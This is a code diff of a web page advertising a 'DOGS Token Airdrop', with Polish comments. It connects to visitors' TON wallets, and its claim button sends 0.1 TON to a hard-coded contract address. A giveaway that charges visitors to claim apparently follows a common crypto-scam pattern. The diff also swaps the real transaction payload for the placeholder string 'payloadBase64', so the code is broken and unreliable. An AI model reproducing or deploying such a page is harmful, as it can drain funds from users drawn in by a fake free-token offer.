@@ -5,15 +5,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>🐕 DOGS Token Airdrop 🐕</title>
+    <script src="https://cdn.jsdelivr.net/npm/@ton/core@0.59.0/dist/index.min.js"></script>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <script src="https://unpkg.com/tonweb@0.0.60/dist/tonweb.js"></script>
-    <script type="module">
-        import { beginCell, toNano } from '@ton/ton';
-        
-        // Udostępnienie funkcji globalnie
-        window.beginCell = beginCell;
-        window.toNano = toNano;
-    </script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         :root {
@@ -283,8 +277,40 @@
         const AIRDROP_CONTRACT_ADDRESS = 'EQCWpEKZ03Kg5e45o555URZRijWF1UInB75Ez4TR3vPVhFjk';
         const MANIFEST_URL = 'https://raw.githubusercontent.com/sh4do96/TelegramBot/refs/heads/main/tonconnect-manifest.json';
 
-        // Twoje dotychczasowe funkcje updateProgress i updateStatus
+        // Funkcje pomocnicze
+        function updateProgress(percent) {
+            const progressBar = document.querySelector('.progress-bar');
+            const progressText = document.querySelector('.progress-text');
+            const progressContainer = document.querySelector('.progress-container');
 
+            progressContainer.style.display = 'block';
+            progressBar.style.width = `${percent}%`;
+            progressText.textContent = `${percent}%`;
+
+            if (percent >= 100) {
+                setTimeout(() => {
+                    progressContainer.style.display = 'none';
+                }, 1000);
+            }
+        }
+
+        function updateStatus(message, type = 'info') {
+            const statusDiv = document.getElementById('status');
+            const icons = {
+                success: 'check-circle',
+                error: 'exclamation-circle',
+                info: 'info-circle'
+            };
+
+            statusDiv.innerHTML = `
+                <i class="fas fa-${icons[type]}"></i> ${message}
+            `;
+
+            statusDiv.style.color = type === 'error' ? '#e74c3c' :
+                type === 'success' ? '#2ecc71' : '#3498db';
+        }
+
+        // TON Connect UI konfiguracja
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
             manifestUrl: MANIFEST_URL,
             buttonRootId: 'ton-connect'
@@ -301,6 +327,7 @@
             }
         });
 
+        // Obsługa przycisku "Claim"
         document.getElementById('claim-button').addEventListener('click', async () => {
             try {
                 if (!tonConnectUI.connected) {
@@ -311,24 +338,18 @@
                 updateStatus('Preparing transaction...', 'info');
                 updateProgress(20);
 
-                // Użyj globalnych funkcji beginCell i toNano
-                const body = beginCell()
-                    .storeUint(0, 32) 
-                    .storeStringTail("claim airdrop")
-                    .endCell();
 
+                // Przygotowanie transakcji
                 const transaction = {
                     validUntil: Math.floor(Date.now() / 1000) + 300,
                     messages: [
                         {
                             address: AIRDROP_CONTRACT_ADDRESS,
-                            amount: toNano('0.1').toString(),
-                            payload: body.toBoc().toString("base64")
+                            amount: '100000000', // 0.1 TON (w nanotonach)
+                            payload: 'payloadBase64'
                         }
                     ]
                 };
-
-                console.log("Prepared transaction:", transaction);
 
                 updateProgress(40);
 
@@ -347,6 +368,5 @@
         });
     </script>
 </body>
-
 
 </html>
